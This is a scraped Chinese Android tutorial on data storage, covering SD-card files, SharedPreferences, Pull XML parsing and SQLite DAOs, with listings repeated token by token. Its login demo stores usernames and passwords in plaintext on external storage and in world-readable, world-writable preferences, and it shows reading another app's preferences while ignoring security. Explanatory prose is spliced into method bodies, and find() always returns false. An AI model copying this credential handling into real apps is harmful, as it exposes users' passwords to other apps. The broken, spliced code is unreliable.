    
    
37
    
    
    
    
File
 
file
 
=
 
new
 
File
(
Environment
.
getExternalStorageDirectory
(),
"newfile.txt"
);
38
    
    
    
    
FileOutputStream
 
fos
 
=
 
new
 
FileOutputStream
(
file
);
39
    
    
    
    
String
 
content
 
=
 
name
+
":"
+
pwd
;
40
    
    
    
    
fos
.
write
(
content
.
getBytes
());
41
    
    
    
    
fos
.
flush
();
42
    
    
    
    
fos
.
close
();
43
    
    
    
    
Toast
.
makeText
(
context
, 
"保存成功"
, 
Toast
.
LENGTH_LONG
).
show
();
44
    
    
    
}
else
{
45
    
    
    
    
Toast
.
makeText
(
context
, 
"sd卡不可用请检查sd卡的状态"
, 
Toast
.
LENGTH_LONG
).
show
();
46
    
    
    
}
47
48
    
    
} 
catch
 (
Exception
 
e
) {
49
    
    
    
Toast
.
makeText
(
context
, 
"写sd卡数据失败"
, 
Toast
.
LENGTH_LONG
).
show
();
50
    
    
    
e
.
printStackTrace
();
51
    
    
}
52
    
}
53
Environment
.
getExternalStorageState
()
方法用于获取SDCard的状态，如果手机装有SDCard，并且可以进行读写，那么方法返回的状态等于Environment
.
MEDIA_MOUNTED。
54
Environment
.
getExternalStorageDirectory
()
方法用于获取SDCard的目录，当然要获取SDCard的目录，你也可以这样写：
55
File
 
sdCardDir
 
=
 
new
 
File
(
"/mnt/sdcard"
); 
//获取SDCard目录
56
File
 
saveFile
 
=
 
new
 
File
(
sdCardDir
, 
"itcast.txt"
); 
57
//上面两句代码可以合成一句： File saveFile = new File("/mnt/sdcard/itcast.txt");
58
FileOutputStream
 
outStream
 
=
 
new
 
FileOutputStream
(
saveFile
);
59
outStream
.
write
(
"传智播客test"
.
getBytes
());
60
outStream
.
close
();
61
62
}
Activity还提供了getCacheDir()和getFilesDir()方法：
getCacheDir()方法用于获取/data/data/<package name>/cache目录
getFilesDir()方法用于获取/data/data/<package name>/files目录


在程序中访问SDCard，你需要申请访问SDCard的权限。
在AndroidManifest.xml中加入访问SDCard的权限如下:
<!-- 在SDCard中创建与删除文件权限 -->
<uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
<!-- 往SDCard写入数据权限 -->
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
------------------------------------------
------------写入
很多时候我们开发的软件需要向用户提供软件 参数设置功能 ，例如我们常用的QQ，用户可以设置是否允许陌生人添加自己为好友。对于软件配置参数的保存，如果是window软件通常我们会采用ini文件进行保存，如果是j2se应用，我们会采用properties属性文件或者xml进行保存。如果是Android应用，我们最适合采用什么方式保存软件配置参数呢？Android平台给我们提供了一个 SharedPreferences 类，它是一个轻量级的存储类，特别适合用于保存软件配置参数。使用SharedPreferences保存数据，其背后是用 xml 文件存放数据，文件存放在/data/data/<package name>/shared_prefs目录下：
SharedPreferences sharedPreferences = getSharedPreferences("itcast", Context.MODE_PRIVATE);
Editor editor = sharedPreferences.edit();//获取编辑器
editor.putString("name", "传智播客");
editor.putInt("age", 4);
editor.commit();//提交修改
生成的itcast.xml文件内容如下：
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
<string name="name">传智播客</string>
<int name="age" value="4" />
</map>
因为SharedPreferences背后是使用xml文件保存数据，getSharedPreferences(name,mode)方法的第一个参数用于指定该 文件的名称 ，名称不用带后缀，后缀会由Android自动加上。方法的第二个参数指定文件的操作模式，共有四种操作模式，这四种模式前面介绍使用文件方式保存数据时已经讲解过。如果希望SharedPreferences背后使用的xml文件能被其他应用读和写，可以指定Context.MODE_WORLD_READABLE和Context.MODE_WORLD_WRITEABLE权限。
另外Activity还提供了另一个getPreferences(mode)方法操作SharedPreferences，这个方法默认使用当前类不带包名的类名作为文件的名称。
------------读取
访问SharedPreferences中的数据代码如下：
SharedPreferences sharedPreferences = getSharedPreferences("itcast", Context.MODE_PRIVATE);
//getString()第二个参数为缺省值，如果preference中不存在该key，将返回缺省值
String name = sharedPreferences.getString("name", "");
int age = sharedPreferences.getInt("age", 1);


如果访问其他应用中的Preference，前提条件是：该preference创建时指定了Context.MODE_WORLD_READABLE或者Context.MODE_WORLD_WRITEABLE权限。如：有个<package name>为cn.itcast.action的应用使用下面语句创建了preference。
getSharedPreferences("itcast", Context.MODE_WORLD_READABLE);
其他应用要访问上面应用的preference，首先需要创建上面应用的Context，然后通过Context 访问preference ，访问preference时会在应用所在包下的shared_prefs目录找到preference ：
Context otherAppsContext = createPackageContext ("cn.itcast.action", Context.CONTEXT_IGNORE_SECURITY);
SharedPreferences sharedPreferences = otherAppsContext.getSharedPreferences("itcast", Context.MODE_WORLD_READABLE);
String name = sharedPreferences.getString("name", "");
int age = sharedPreferences.getInt("age", 0);


如果不通过创建Context访问其他应用的preference，也可以以 读取xml文件 方式直接访问其他应用preference对应的xml文件，如： 
File xmlFile = new File(“/data/data/<package name>/shared_prefs/itcast.xml”);//<package name>应替换成应用的包名
public class DemoActivity extends Activity implements OnClickListener { private EditText mEtName; private EditText mEtPwd; private Button mBtLogin; private CheckBox mCb; private SharedPreferences sp; // 用来保存参数的接口       @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main); mEtName = (EditText) this.findViewById(R.id.et_name); mEtPwd= (EditText) this.findViewById(R.id.et_pwd); mBtLogin = (Button) this.findViewById(R.id.bt_login); mCb = (CheckBox) this.findViewById(R.id.cb_remember_pwd);          // 初始化 sharedpreference          sp = this.getSharedPreferences("config.txt",Context.MODE_WORLD_READABLE|Context.MODE_WORLD_WRITEABLE);                  boolean issetup = sp.getBoolean("issetup", false);         if(issetup){         	String name = sp.getString("name", "");         	String pwd = sp.getString("pwd", "");         	mEtName.setText(name);         	mEtPwd.setText(pwd);         }       mBtLogin.setOnClickListener(this);     }  @Override public void onClick(View v) { switch (v.getId()) { case R.id.bt_login: String name  =mEtName.getText().toString().trim(); String pwd = mEtPwd.getText().toString().trim(); // 得到sharedpreference的编辑器  Editor editor =  sp.edit(); editor.putString("name", name); editor.putString("pwd", pwd); editor.putBoolean("issetup", true); // 清空编辑器里面的内容  // editor.clear();  // 非常重要 editor.commit(); Toast.makeText(this, "保存密码成功", Toast.LENGTH_SHORT).show(); break;  }  } }

52
 
1
public
 
class
 
DemoActivity
 
extends
 
Activity
 
implements
 
OnClickListener
 {
2
    
private
 
EditText
 
mEtName
;
3
    
private
 
EditText
 
mEtPwd
;
4
    
private
 
Button
 
mBtLogin
;
5
    
private
 
CheckBox
 
mCb
;
6
    
private
 
SharedPreferences
 
sp
; 
// 用来保存参数的接口 
7
8
    
@Override
9
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
10
        
super
.
onCreate
(
savedInstanceState
);
11
        
setContentView
(
R
.
layout
.
main
);
12
    
    
mEtName
 
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_name
);
13
    
    
mEtPwd
=
 (
EditText
) 
this
.
findViewById
(
R
.
id
.
et_pwd
);
14
    
    
mBtLogin
 
=
 (
Button
) 
this
.
findViewById
(
R
.
id
.
bt_login
);
15
    
    
mCb
 
=
 (
CheckBox
) 
this
.
findViewById
(
R
.
id
.
cb_remember_pwd
);
16
    
    
17
        
// 初始化 sharedpreference 
18
        
sp
 
=
 
this
.
getSharedPreferences
(
"config.txt"
,
Context
.
MODE_WORLD_READABLE
|
Context
.
MODE_WORLD_WRITEABLE
);
19
        
20
        
boolean
 
issetup
 
=
 
sp
.
getBoolean
(
"issetup"
, 
false
);
21
        
if
(
issetup
){
22
        
    
String
 
name
 
=
 
sp
.
getString
(
"name"
, 
""
);
23
        
    
String
 
pwd
 
=
 
sp
.
getString
(
"pwd"
, 
""
);
24
        
    
mEtName
.
setText
(
name
);
25
        
    
mEtPwd
.
setText
(
pwd
);
26
        }      
27
    
    
mBtLogin
.
setOnClickListener
(
this
);
28
    }
29
30
    
@Override
31
    
public
 
void
 
onClick
(
View
 
v
) {
32
    
    
switch
 (
v
.
getId
()) {
33
    
    
case
 
R
.
id
.
bt_login
:
34
    
    
    
String
 
name
  
=
mEtName
.
getText
().
toString
().
trim
();
35
    
    
    
String
 
pwd
 
=
 
mEtPwd
.
getText
().
toString
().
trim
();
36
    
    
    
// 得到sharedpreference的编辑器 
37
    
    
    
Editor
 
editor
 
=
  
sp
.
edit
();
38
    
    
    
editor
.
putString
(
"name"
, 
name
);
39
    
    
    
editor
.
putString
(
"pwd"
, 
pwd
);
40
    
    
    
editor
.
putBoolean
(
"issetup"
, 
true
);
41
    
    
    
// 清空编辑器里面的内容 
42
    
    
    
// editor.clear();
43
    
    
    
44
    
    
    
// 非常重要
45
    
    
    
editor
.
commit
();
46
    
    
    
Toast
.
makeText
(
this
, 
"保存密码成功"
, 
Toast
.
LENGTH_SHORT
).
show
();
47
    
    
    
break
;
48
49
    
    
}
50
    
    
51
    
}
52
}


除了可以使用 SAX或DOM 解析XML文件之外，大家也可以使用Android内置的 Pull解析器解析XML文件 。 Pull解析器是一个开源的java项目，既可以用于android，也可以用于JavaEE。如果用在javaEE需要把其jar文件放入类路径中，因为Android已经集成进了Pull解析器，所以无需添加任何jar文件。android系统本身使用到的各种xml文件，其内部也是采用Pull解析器进行解析的。 Pull解析器的运行方式与 SAX 解析器相似。它提供了类似的 事件 ，如：开始元素和结束元素事件，使用parser.next()可以进入下一个元素并触发相应事件。跟SAX不同的是， Pull解析器产生的事件是一个数字，而非方法，因此可以使用一个switch对感兴趣的事件进行处理。当元素开始解析时，调用parser.nextText()方法可以获取下一个Text类型节点的值。



有些时候，我们需要生成一个XML文件，生成XML文件的方法有很多，如：可以只使用一个 StringBuilder 组拼XML内容，然后把内容写入到文件中；或者使用 DOM API 生成XML文件，或者也可以使用pull解析器生成XML文件，这里推荐大家使用Pull解析器。
public class MainActivity extends Activity {     /** Called when the activity is first created. */     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);         TextView tv = (TextView) this.findViewById(R.id.tv);         PersonService service = new PersonService(this);         List<Person> persons = service.getPersons("person.xml");         StringBuffer sb = new StringBuffer();         for(Person person : persons){         	String age = "年龄"+ person.getAge();         	String name  =person.getName();         	String id = "id="+ person.getId();         	sb.append(name +" "+ age+" "+id);         }         tv.setText( sb.toString());     } }

19
 
1
public
 
class
 
MainActivity
 
extends
 
Activity
 {
2
    
/** Called when the activity is first created. */
3
    
@Override
4
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
5
        
super
.
onCreate
(
savedInstanceState
);
6
        
setContentView
(
R
.
layout
.
main
);
7
        
TextView
 
tv
 
=
 (
TextView
) 
this
.
findViewById
(
R
.
id
.
tv
);
8
        
PersonService
 
service
 
=
 
new
 
PersonService
(
this
);
9
        
List
<
Person
>
 
persons
 
=
 
service
.
getPersons
(
"person.xml"
);
10
        
StringBuffer
 
sb
 
=
 
new
 
StringBuffer
();
11
        
for
(
Person
 
person
 : 
persons
){
12
        
    
String
 
age
 
=
 
"年龄"
+
 
person
.
getAge
();
13
        
    
String
 
name
  
=
person
.
getName
();
14
        
    
String
 
id
 
=
 
"id="
+
 
person
.
getId
();
15
        
    
sb
.
append
(
name
 
+
" "
+
 
age
+
" "
+
id
);
16
        }
17
        
tv
.
setText
( 
sb
.
toString
());
18
    }
19
}
public class PersonService { private Context context;  public PersonService(Context context) { this.context = context; }  /** * 把person.xml的输入流 解析 转化成list集合  * @param filename  assets目录下的文件名  * @return */ public List<Person> getPersons(String filename){ AssetManager manager = context.getAssets();    //得到Assets下的资源 try { InputStream  is = manager.open(filename); //在android下使用pull解析xml文件  //1.获取pull解析器的实例 XmlPullParser  parser = Xml.newPullParser(); //2.设置解析器的一些参数  parser.setInput(is, "utf-8"); // 获取pull解析器对应的事件类型  int type = parser.getEventType(); Person person = null; List<Person> persons = new ArrayList<Person>(); while(type!=XmlPullParser.END_DOCUMENT){  if(type==XmlPullParser.START_TAG){ if("person".equals(parser.getName())){ person = new Person(); int id =Integer.parseInt( parser.getAttributeValue(0)); person.setId(id); }else if("name".equals(parser.getName())){ String name = parser.nextText(); person.setName(name); }else if("age".equals(parser.getName())){ int age = Integer.parseInt( parser.nextText()); person.setAge(age); } } if(type==XmlPullParser.END_TAG){ if("person".equals(parser.getName())){ persons.add(person); person = null; } }   type = parser.next(); }  return persons;   } catch (Exception e) { e.printStackTrace(); Toast.makeText(context, "获取person.xml失败", Toast.LENGTH_SHORT).show(); return null; } }  /** * 把persons集合里面的内容写到xml文件里面  * @param persons person的集合 * @return */ public boolean savePersonToXml(List<Person> persons){ try { XmlSerializer  serializer =  Xml.newSerializer(); // /sdcard/person.xml  // mount unmount 文件系统的权限  File file = new File(Environment.getExternalStorageDirectory(),"person.xml"); FileOutputStream fos = new FileOutputStream(file); serializer.setOutput(fos, "utf-8"); serializer.startDocument("utf-8", true); serializer.startTag(null, "persons"); for(Person person:persons){ serializer.startTag(null, "person");  serializer.attribute(null, "id", person.getId()+"");  serializer.startTag(null,"name"); serializer.text(person.getName()); serializer.endTag(null, "name");  serializer.startTag(null,"age"); serializer.text(person.getAge()+""); serializer.endTag(null, "age");   serializer.endTag(null, "person"); } serializer.endTag(null, "persons"); serializer.endDocument(); fos.flush(); fos.close(); return true; } catch (Exception e) { e.printStackTrace(); return false; } } }

103
 
1
public
 
class
 
PersonService
 {
2
    
private
 
Context
 
context
;
3
    
4
    
public
 
PersonService
(
Context
 
context
) {
5
    
    
this
.
context
 
=
 
context
;
6
    
}
7
8
    
/**
9
    
 
* 把person.xml的输入流 解析 转化成list集合 
10
    
 
* @param filename  assets目录下的文件名 
11
    
 
* @return
12
    
 
*/
13
    
public
 
List
<
Person
>
 
getPersons
(
String
 
filename
){
14
    
    
AssetManager
 
manager
 
=
 
context
.
getAssets
();    
//得到Assets下的资源
15
    
    
try
 {
16
    
    
    
InputStream
  
is
 
=
 
manager
.
open
(
filename
);
17
    
    
    
//在android下使用pull解析xml文件 
18
    
    
    
//1.获取pull解析器的实例
19
    
    
    
XmlPullParser
  
parser
 
=
 
Xml
.
newPullParser
();
20
    
    
    
//2.设置解析器的一些参数 
21
    
    
    
parser
.
setInput
(
is
, 
"utf-8"
);
22
    
    
    
// 获取pull解析器对应的事件类型 
23
    
    
    
int
 
type
 
=
 
parser
.
getEventType
();
24
    
    
    
Person
 
person
 
=
 
null
;
25
    
    
    
List
<
Person
>
 
persons
 
=
 
new
 
ArrayList
<
Person
>
();
26
    
    
    
while
(
type
!=
XmlPullParser
.
END_DOCUMENT
){
27
    
28
    
    
    
    
if
(
type
==
XmlPullParser
.
START_TAG
){
29
    
    
    
    
    
if
(
"person"
.
equals
(
parser
.
getName
())){
30
    
    
    
    
    
    
person
 
=
 
new
 
Person
();
31
    
    
    
    
    
    
int
 
id
 
=
Integer
.
parseInt
( 
parser
.
getAttributeValue
(
0
));
32
    
    
    
    
    
    
person
.
setId
(
id
);
33
    
    
    
    
    
}
else
 
if
(
"name"
.
equals
(
parser
.
getName
())){
34
    
    
    
    
    
    
String
 
name
 
=
 
parser
.
nextText
();
35
    
    
    
    
    
    
person
.
setName
(
name
);
36
    
    
    
    
    
}
else
 
if
(
"age"
.
equals
(
parser
.
getName
())){
37
    
    
    
    
    
    
int
 
age
 
=
 
Integer
.
parseInt
( 
parser
.
nextText
());
38
    
    
    
    
    
    
person
.
setAge
(
age
);
39
    
    
    
    
    
}
40
    
    
    
    
}
41
    
    
    
    
if
(
type
==
XmlPullParser
.
END_TAG
){
42
    
    
    
    
    
if
(
"person"
.
equals
(
parser
.
getName
())){
43
    
    
    
    
    
    
persons
.
add
(
person
);
44
    
    
    
    
    
    
person
 
=
 
null
;
45
    
    
    
    
    
}
46
    
    
    
    
}
47
    
    
    
    
48
    
    
    
    
49
    
    
    
    
 
type
 
=
 
parser
.
next
();
50
    
    
    
}
51
    
    
    
52
    
    
    
return
 
persons
;
53
    
    
    
54
    
    
    
55
    
    
} 
catch
 (
Exception
 
e
) {
56
    
    
    
e
.
printStackTrace
();
57
    
    
    
Toast
.
makeText
(
context
, 
"获取person.xml失败"
, 
Toast
.
LENGTH_SHORT
).
show
();
58
    
    
    
return
 
null
;
59
    
    
}
60
    
}
61
    
62
    
/**
63
    
 
* 把persons集合里面的内容写到xml文件里面 
64
    
 
* @param persons person的集合
65
    
 
* @return
66
    
 
*/
67
    
public
 
boolean
 
savePersonToXml
(
List
<
Person
>
 
persons
){
68
    
    
try
 {
69
    
    
    
XmlSerializer
  
serializer
 
=
  
Xml
.
newSerializer
();
70
    
    
    
// /sdcard/person.xml 
71
    
    
    
// mount unmount 文件系统的权限 
72
    
    
    
File
 
file
 
=
 
new
 
File
(
Environment
.
getExternalStorageDirectory
(),
"person.xml"
);
73
    
    
    
FileOutputStream
 
fos
 
=
 
new
 
FileOutputStream
(
file
);
74
    
    
    
serializer
.
setOutput
(
fos
, 
"utf-8"
);
75
    
    
    
serializer
.
startDocument
(
"utf-8"
, 
true
);
76
    
    
    
serializer
.
startTag
(
null
, 
"persons"
);
77
    
    
    
for
(
Person
 
person
:
persons
){
78
    
    
    
    
serializer
.
startTag
(
null
, 
"person"
);
79
    
    
    
    
80
    
    
    
    
serializer
.
attribute
(
null
, 
"id"
, 
person
.
getId
()
+
""
);
81
    
    
    
    
82
    
    
    
    
serializer
.
startTag
(
null
,
"name"
);
83
    
    
    
    
serializer
.
text
(
person
.
getName
());
84
    
    
    
    
serializer
.
endTag
(
null
, 
"name"
);
85
    
    
    
    
86
    
    
    
    
serializer
.
startTag
(
null
,
"age"
);
87
    
    
    
    
serializer
.
text
(
person
.
getAge
()
+
""
);
88
    
    
    
    
serializer
.
endTag
(
null
, 
"age"
);
89
    
    
    
    
90
    
    
    
    
91
    
    
    
    
serializer
.
endTag
(
null
, 
"person"
);
92
    
    
    
}
93
    
    
    
serializer
.
endTag
(
null
, 
"persons"
);
94
    
    
    
serializer
.
endDocument
();
95
    
    
    
fos
.
flush
();
96
    
    
    
fos
.
close
();
97
    
    
    
return
 
true
;
98
    
    
} 
catch
 (
Exception
 
e
) {
99
    
    
    
e
.
printStackTrace
();
100
    
    
    
return
 
false
;
101
    
    
}
   
    
102
    
}
   
103
}
---------------------------------sqlite----------------------------------------
public class MyActivity extends Activity {     /**      * Called when the activity is first created.      */     @Override     public void onCreate(Bundle savedInstanceState) {         super.onCreate(savedInstanceState);         setContentView(R.layout.main);         MyDBOpenHelper helper = new MyDBOpenHelper(this);         helper.getReadableDatabase(); getWritableDatabase()和getReadableDatabase()方法都可以获取一个用于操作数据库的SQLiteDatabase实例。但getWritableDatabase() 方法以读写方式打开数据库，一旦数据库的磁盘空间满了，数据库就只能读而不能写，倘若使用getWritableDatabase()打开数据库就会出错。getReadableDatabase()方法先以读写方式打开数据库，如果数据库的磁盘空间满了，就会打开失败，当打开失败后会继续尝试以只读方式打开数据库。     } }

13
 
1
public
 
class
 
MyActivity
 
extends
 
Activity
 {
2
    
/**
3
     
* Called when the activity is first created.
4
     
*/
5
    
@Override
6
    
public
 
void
 
onCreate
(
Bundle
 
savedInstanceState
) {
7
        
super
.
onCreate
(
savedInstanceState
);
8
        
setContentView
(
R
.
layout
.
main
);
9
        
MyDBOpenHelper
 
helper
 
=
 
new
 
MyDBOpenHelper
(
this
);
10
        
helper
.
getReadableDatabase
();
11
getWritableDatabase
()
和getReadableDatabase
()
方法都可以获取一个用于操作数据库的SQLiteDatabase实例。但getWritableDatabase
() 
方法以读写方式打开数据库，一旦数据库的磁盘空间满了，数据库就只能读而不能写，倘若使用getWritableDatabase
()
打开数据库就会出错。getReadableDatabase
()
方法先以读写方式打开数据库，如果数据库的磁盘空间满了，就会打开失败，当打开失败后会继续尝试以只读方式打开数据库。
12
    }
13
}
public class MyDBOpenHelper extends SQLiteOpenHelper {  //SQLiteOpenHelper的抽象类，必须继承它才能使用  /** *  * @param context 应用程序上下文 * @param name    数据库的名字 * @param factory 查询数据库的游标工厂 一般情况下 用sdk默认的 * @param version  数据库的版本 版本号必须不小1  *   */ public MyDBOpenHelper(Context context) { super(context, "itheima.db", null, 5);  //5是版本号 }  // 在mydbOpenHelper 在数据库第一次被创建的时候  会执行onCreate(); @Override public void onCreate(SQLiteDatabase db) { System.out.println("我被调用了 oncreate"); db.execSQL("CREATE TABLE person (personid integer primary key autoincrement, name varchar(20))"); }  @Override       //版本号变化的时候执行，一般在软件升级时才需改变版本号， public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) { System.out.println("on update "); db.execSQL("ALTER TABLE person ADD phone VARCHAR(12) NULL "); } } 当调用SQLiteOpenHelper的getWritableDatabase()或者getReadableDatabase()方法获取用于操作数据库的SQLiteDatabase实例的时候，如果数据库不存在，Android系统会自动生成一个数据库，接着调用onCreate()方法，onCreate()方法在初次生成数据库时才会被调用，在onCreate()方法里可以生成数据库表结构及添加一些应用使用到的初始化数据。onUpgrade()方法在数据库的版本发生变化时会被调用，一般在软件升级时才需改变版本号，而数据库的版本是由程序员控制的，    第一次调用getWritableDatabase()或getReadableDatabase()方法后，SQLiteOpenHelper会缓存当前的SQLiteDatabase实例，SQLiteDatabase实例正常情况下会维持数据库的打开状态，所以在你不再需要SQLiteDatabase实例时，请及时调用close()方法释放资源。一旦SQLiteDatabase实例被缓存，多次调用getWritableDatabase()或getReadableDatabase()方法得到的都是同一实例。

33
 
1
public
 
class
 
MyDBOpenHelper
 
extends
 
SQLiteOpenHelper
 {  
//SQLiteOpenHelper的抽象类，必须继承它才能使用
2
3
    
/**
4
    
 
* 
5
    
 
* @param context 应用程序上下文
6
    
 
* @param name    数据库的名字
7
    
 
* @param factory 查询数据库的游标工厂 一般情况下 用sdk默认的
8
    
 
* @param version  数据库的版本 版本号必须不小1 
9
    
 
*  
10
    
 
*/
11
    
public
 
MyDBOpenHelper
(
Context
 
context
) {
12
    
    
super
(
context
, 
"itheima.db"
, 
null
, 
5
);  
//5是版本号
13
    
}
14
15
    
// 在mydbOpenHelper 在数据库第一次被创建的时候  会执行onCreate();
16
    
@Override
17
    
public
 
void
 
onCreate
(
SQLiteDatabase
 
db
) {
18
    
    
System
.
out
.
println
(
"我被调用了 oncreate"
);
19
    
    
db
.
execSQL
(
"CREATE TABLE person (personid integer primary key autoincrement, name varchar(20))"
);
20
    
}
21
    
22
    
@Override
       
//版本号变化的时候执行，一般在软件升级时才需改变版本号，
23
    
public
 
void
 
onUpgrade
(
SQLiteDatabase
 
db
, 
int
 
oldVersion
, 
int
 
newVersion
) {
24
    
    
System
.
out
.
println
(
"on update "
);
25
    
    
db
.
execSQL
(
"ALTER TABLE person ADD phone VARCHAR(12) NULL "
);
26
    
}
27
}
28
当调用SQLiteOpenHelper的getWritableDatabase
()
或者getReadableDatabase
()
方法获取用于操作数据库的SQLiteDatabase实例的时候，如果数据库不存在，Android系统会自动生成一个数据库，接着调用onCreate
()
方法，onCreate
()
方法在初次生成数据库时才会被调用，在onCreate
()
方法里可以生成数据库表结构及添加一些应用使用到的初始化数据。onUpgrade
()
方法在数据库的版本发生变化时会被调用，一般在软件升级时才需改变版本号，而数据库的版本是由程序员控制的，
29
30
31
32
第一次调用getWritableDatabase
()
或getReadableDatabase
()
方法后，SQLiteOpenHelper会缓存当前的SQLiteDatabase实例，SQLiteDatabase实例正常情况下会维持数据库的打开状态，所以在你不再需要SQLiteDatabase实例时，请及时调用close
()
方法释放资源。一旦SQLiteDatabase实例被缓存，多次调用getWritableDatabase
()
或getReadableDatabase
()
方法得到的都是同一实例。
33


public class PersonDao {     private static final String TAG = "PersonDao";     private MyDBOpenHelper dbOpenHelper;       // 在personDao被new出来的时候 就完成初始化       public PersonDao(Context context) {         dbOpenHelper = new MyDBOpenHelper(context);         // dbOpenHelper.getReadableDatabase()         // dbOpenHelper.getWritableDatabase()     }       // 增删改查       /**      * 往数据库添加一条数据,每执行一个操作都会进行数据库的开关      */     public void add(String name, String phone) {         boolean result = find(name);         if (result)             return;           SQLiteDatabase db = dbOpenHelper.getWritableDatabase();         if (db.isOpen()) {             db.execSQL("insert into person (name,phone) values (?,?)",                     new Object[]{name, phone});             // 关闭数据库 释放数据库的链接             db.close();         }     }       /**      * 查找数据库的操作      */     public boolean find(String name) {         boolean result = false;         SQLiteDatabase db = dbOpenHelper.getReadableDatabase();         if (db.isOpen()) {             Cursor cursor = db.rawQuery("select * from person where name=?",                     new String[]{name});             if (cursor.moveToFirst()) {                 int index = cursor.getColumnIndex("phone"); // 得到phone在表中是第几列                 String phone = cursor.getString(index);                 Log.i(TAG, "phone =" + phone);                 result = true;               }             // 记得关闭掉 cursor             cursor.close();             result = false;             // 释放数据库的链接             db.close();         }         return result;     }       /**      * 删除一条记录      *      * @param name      */     public void delete(String name) {         SQLiteDatabase db = dbOpenHelper.getWritableDatabase();         if (db.isOpen()) {             db.execSQL("delete from person where name =?",                     new Object[]{name});             db.close();         }     }       /**      * 更新一条记录      */     public void update(String name, String newname, String newphone) {         SQLiteDatabase db = dbOpenHelper.getWritableDatabase();         if (db.isOpen()) {             db.execSQL("update person set name=? , phone=? where name=?",                     new Object[]{newname, newphone, name});             db.close();         }     }       /**      * 查找全部      */     public List<Person> getAllPersons() {         List<Person> persons = null;         SQLiteDatabase db = dbOpenHelper.getReadableDatabase();         if (db.isOpen()) {             persons = new ArrayList<Person>();             Cursor cursor = db.rawQuery("select * from person ", null); rawQuery()方法的第一个参数为select语句；第二个参数为select语句中占位符参数的值，如果select语句没有使用占位符，该参数可以设置为null。带占位符参数的select语句使用例子如下： Cursor cursor = db.rawQuery("select * from person where name like ? and age=?", new String[]{"%传智%", "4"});              while (cursor.moveToNext()) {                 Person person = new Person();                 int nameindex = cursor.getColumnIndex("name");                 int phoneindex = cursor.getColumnIndex("phone");                 String name = cursor.getString(nameindex);                 String phone = cursor.getString(phoneindex);                 person.setName(name);                 person.setNumber(phone);                 persons.add(person);             }             cursor.close();             db.close();         }         return persons;     }   }

111
 
1
public
 
class
 
PersonDao
 {
2
    
private
 
static
 
final
 
String
 
TAG
 
=
 
"PersonDao"
;
3
    
private
 
MyDBOpenHelper
 
dbOpenHelper
;
4
 
5
    
// 在personDao被new出来的时候 就完成初始化
6
 
7
    
public
 
PersonDao
(
Context
 
context
) {
8
        
dbOpenHelper
 
=
 
new
 
MyDBOpenHelper
(
context
);
9
        
// dbOpenHelper.getReadableDatabase()
10
        
// dbOpenHelper.getWritableDatabase()
11
    }
12
 
13
    
// 增删改查
14
 
15
    
/**
16
     
* 往数据库添加一条数据,每执行一个操作都会进行数据库的开关
17
     
*/
18
    
public
 
void
 
add
(
String
 
name
, 
String
 
phone
) {
19
        
boolean
 
result
 
=
 
find
(
name
);
20
        
if
 (
result
)
21
            
return
;
22
 
23
        
SQLiteDatabase
 
db
 
=
 
dbOpenHelper
.
getWritableDatabase
();
24
        
if
 (
db
.
isOpen
()) {
25
            
db
.
execSQL
(
"insert into person (name,phone) values (?,?)"
,
26
                    
new
 
Object
[]{
name
, 
phone
});
27
            
// 关闭数据库 释放数据库的链接
28
            
db
.
close
();
29
        }
30
    }
31
 
32
    
/**
33
     
* 查找数据库的操作
34
     
*/
35
    
public
 
boolean
 
find
(
String
 
name
) {
36
        
boolean
 
result
 
=
 
false
;
37
        
SQLiteDatabase
 
db
 
=
 
dbOpenHelper
.
getReadableDatabase
();
38
        
if
 (
db
.
isOpen
()) {
39
            
Cursor
 
cursor
 
=
 
db
.
rawQuery
(
"select * from person where name=?"
,
40
                    
new
 
String
[]{
name
});
41
            
if
 (
cursor
.
moveToFirst
()) {
42
                
int
 
index
 
=
 
cursor
.
getColumnIndex
(
"phone"
); 
// 得到phone在表中是第几列
43
                
String
 
phone
 
=
 
cursor
.
getString
(
index
);
44
                
Log
.
i
(
TAG
, 
"phone ="
 
+
 
phone
);
45
                
result
 
=
 
true
;
46
 
47
            }
48
            
// 记得关闭掉 cursor
49
            
cursor
.
close
();
50
            
result
 
=
 
false
;
51
            
// 释放数据库的链接
52
            
db
.
close
();
53
        }
54
        
return
 
result
;
55
    }
56
 
57
    
/**
58
     
* 删除一条记录
59
     
*
60
     
* @param name
61
     
*/
62
    
public
 
void
 
delete
(
String
 
name
) {
63
        
SQLiteDatabase
 
db
 
=
 
dbOpenHelper
.
getWritableDatabase
();
64
        
if
 (
db
.
isOpen
()) {
65
            
db
.
execSQL
(
"delete from person where name =?"
,
66
                    
new
 
Object
[]{
name
});
67
            
db
.
close
();
68
        }
69
    }
70
 
71
    
/**
72
     
* 更新一条记录
73
     
*/
74
    
public
 
void
 
update
(
String
 
name
, 
String
 
newname
, 
String
 
newphone
) {
75
        
SQLiteDatabase
 
db
 
=
 
dbOpenHelper
.
getWritableDatabase
();
76
        
if
 (
db
.
isOpen
()) {
77
            
db
.
execSQL
(
"update person set name=? , phone=? where name=?"
,
78
                    
new
 
Object
[]{
newname
, 
newphone
, 
name
});
79
            
db
.
close
();
80
        }
81
    }
82
 
83
    
/**
84
     
* 查找全部
85
     
*/
86
    
public
 
List
<
Person
>
 
getAllPersons
() {
87
        
List
<
Person
>
 
persons
 
=
 
null
;
88
        
SQLiteDatabase
 
db
 
=
 
dbOpenHelper
.
getReadableDatabase
();
89
        
if
 (
db
.
isOpen
()) {
90
            
persons
 
=
 
new
 
ArrayList
<
Person
>
();
91
            
Cursor
 
cursor
 
=
 
db
.
rawQuery
(
"select * from person "
, 
null
);
92
rawQuery
()
方法的第一个参数为select语句；第二个参数为select语句中占位符参数的值，如果select语句没有使用占位符，该参数可以设置为null。带占位符参数的select语句使用例子如下：
93
Cursor
 
cursor
 
=
 
db
.
rawQuery
(
"select * from person where name like ? and age=?"
, 
new
 
String
[]{
"%传智%"
, 
"4"
});
94
95
            
while
 (
cursor
.
moveToNext
()) {
96
                
Person
 
person
 
=
 
new
 
Person
();
97
                
int
 
nameindex
 
=
